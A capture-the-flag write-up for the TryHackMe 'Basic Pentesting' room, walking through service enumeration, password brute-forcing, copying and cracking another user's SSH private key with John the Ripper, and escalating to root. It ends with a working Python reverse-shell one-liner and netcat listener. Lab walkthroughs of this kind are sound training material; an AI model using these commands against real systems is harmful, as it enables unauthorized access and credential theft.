---
title: Basic Pentesting CTF Writeup
tags:
  - ctf
  - easy
  - tryhackme
  - web
  - privilege_escalation
---
# [Basic Pentesting](https://tryhackme.com/r/room/basicpentestingjt) - TryHackMe

**Author:** [ashu](https://tryhackme.com/p/ashu)
**Date:** July 29, 2019.
**Category:** General   
**Difficulty:** Easy   

---
## Challenge Description

In these set of tasks you'll learn the following:

- brute forcing 
- hash cracking 
- service enumeration
- Linux Enumeration

Questions are to be answered regarding the machine. The questions are
- Find the services exposed by the machine
- What is the name of the hidden directory on the web server(enter name without /)?
- User brute-forcing to find the username & password
- What service do you use to access the server(answer in abbreviation in all caps)?
- Enumerate the machine to find any vectors for privilege escalation
- What is the name of the other user you found(all lower case)?
- If you have found another user, what can you do with this information?
- What is the final password you obtain?

---

First ping the machine....it's active. Now we can run a quick [[Nmap]] scan.

```
nmap  -vv $ip -T4 -sV   
```

the output shows the following ports open

```
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?      syn-ack
8080/tcp open  http-proxy  syn-ack
```

Seeing HTTP Lets open this up in the browser and also run [[Gobuster]]

```
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt
```

This gives us the name of the hidden directory. Which is the answer to a question.

```
[Size: 318] [--> http://10.10.68.231/***********/]
```

Let's visit this directory on the browser. got 2 text files containing the following data.

dev.txt
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

The SMB and the version number might be important. we may be able to exploit it.

J.txt
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

looks like Mr. J has a weak password we can use hydra to crack it. J also might be the initial letter of the username.
Let's try using [[enum4linux]] on the machine. I got this by looking at a writeup.

```
enum4linux -a $ip
```

This basically gives us information about the host machine. This gives us the name of the users of the machine.

Brute forcing the password of Mr. J gives us the password and the answer to one of our questions as well.

We SSH into the machine and find out that Mr. J is not trusted at all and is not given any kind of admin permissions . so we got to find some way of accessing the other user. Luckily in home directory we find Mr. K with the following files:

```
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
```

the `pass.bak`looks interesting an may contain a password. We have a look into the `.ssh` folder 
we find the following

```
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

We might be able to find the key by cracking the hash of `id_rsa`. First we transfer it to our machine using [[scp]]
```
scp j**@$ip:/home/kay/.ssh/id_rsa id_rsa.orig
```

First we get the hash from the key.

```
python /usr/share/john/ssh2john.py id_rsa.orig > id_rsa.hash
```

after the we use [[John The Ripper]] to crack the hash

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

This gives us the key phrase we can use it and the private key to [[SSH]] using the Mr. K. Great we now have access. now we can see what is inside the `pass.bak` file . and surely enough we get the password.

Use the password to check what privileges you have using `sudo -l` . Looks like we have all the privileges so we can access the root folder and also see a flag there from the author.

This completes the CTF but I went a bit further and got a reverse shell just for practice.

```
nc -lvp 1234
```

and on the target machine:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Thanks for Reading!